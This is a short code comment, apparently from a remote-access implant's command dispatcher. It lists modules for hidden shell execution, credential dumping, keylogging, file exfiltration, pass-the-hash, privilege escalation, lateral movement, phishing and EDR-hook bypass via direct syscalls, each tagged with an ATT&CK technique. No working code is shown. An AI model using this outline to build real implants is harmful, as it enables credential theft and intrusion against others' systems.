// Command execution dispatcher — each sub-module handles one C2 command — T1059
//
// shell     : cmd.exe / powershell with CREATE_NO_WINDOW + anonymous pipes
// creds     : OS credential dumping (T1003)
// keylog    : keyboard input capture start/stop/dump (T1056.001)
// loot      : sensitive file exfiltration (T1005)
// crack     : local hash cracking (T1110)
// pth       : pass-the-hash lateral movement (T1550.002)
// privesc   : local privilege escalation via misconfiguration (T1068)
// propagate : lateral movement (T1021)
// phish     : credential harvesting lure (T1598)
// rdp       : enable / disable Remote Desktop (T1021.001)
// syscall   : direct userland syscall bypassing EDR hooks
